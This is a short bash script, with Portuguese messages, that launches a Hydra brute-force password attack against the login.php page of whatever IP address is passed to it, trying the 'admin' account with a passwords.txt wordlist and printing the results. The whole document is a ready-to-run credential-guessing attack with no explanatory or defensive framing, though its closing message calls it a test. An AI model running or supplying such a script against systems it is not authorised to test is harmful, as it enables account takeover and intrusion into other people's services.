#!/bin/bash
IP=$1
echo "[INFO] Iniciando ataque com Hydra contra $IP..."
sleep 1
hydra -l admin -P passwords.txt http://$IP/login.php -V -t 4 > resultado.txt
cat resultado.txt
echo "[SUCESSO] Teste concluído."
